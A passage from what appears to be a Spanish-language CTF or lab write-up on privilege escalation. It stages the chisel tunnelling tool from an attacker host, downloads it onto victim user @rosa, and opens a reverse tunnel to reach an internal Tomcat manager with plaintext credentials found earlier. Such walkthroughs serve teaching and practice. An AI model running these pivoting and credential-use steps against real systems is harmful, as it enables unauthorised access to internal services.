- No hay archivos `SUID` que faciliten escalada directa.



### **Continuando con la escalada de privilegios:**

## Redirigir el puerto 8080 con chisel para acceder a Tomcat

Instalamos chisel:

```sh
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
sudo mv chisel /usr/local/bin/
```

Levantamos un servidor

```sh
chisel server --reverse -p 1234
```

```sh
2025/07/23 21:52:37 server: Reverse tunnelling enabled
2025/07/23 21:52:37 server: Fingerprint bf5ofzMc+e65zCi7zZqudtmhvOCAM814IPllbNrxv5M=
2025/07/23 21:52:37 server: Listening on http://0.0.0.0:1234
```

Estamos esperando conexiones reversas de la víctima

Vamos a servirle un archivo **chisel** a nuestra víctima:

```sh
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
```

Ya creado el archivo chisel, lo servimos:

```sh
python3 -m http.server 8080
```

En el usuario @rosa descargamos el chisel

```sh
wget http://<HOST_IP>:8080/chisel -O /tmp/chisel
```

```sh
chmod +x /tmp/chisel
```

En @rosa  verificamos que el chisel se ejecuta:

```sh
/tmp/chisel --help
```

```sh
  Usage: chisel [command] [--help]

  Version: 1.9.1 (go1.21.0)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

Crear un tunel reverso a mi **host** desde **@rosa**

```sh
/tmp/chisel client <HOST_IP>:1234 R:4444:127.0.0.1:8080
```

Probamos si podemos hacer despliegues:

```sh
curl -u tomitoma:supersecurepasswordultra http://127.0.0.1:4444/manager/text/list > despliegue.txt
```

[despliegue.txt](./Files/despliegue.txt) Con **acceso denegado **a despliegues

En el **host** probamos si tenemos acceso:

```sh
curl -u tomitoma:supersecurepasswordultra http://127.0.0.1:4444/manager/html > manager.html
```

[manager.html](./Files/manager.html)  confirma que ya tenemos acceso al Tomcat Web Application Manager con credenciales válidas y privilegios suficientes.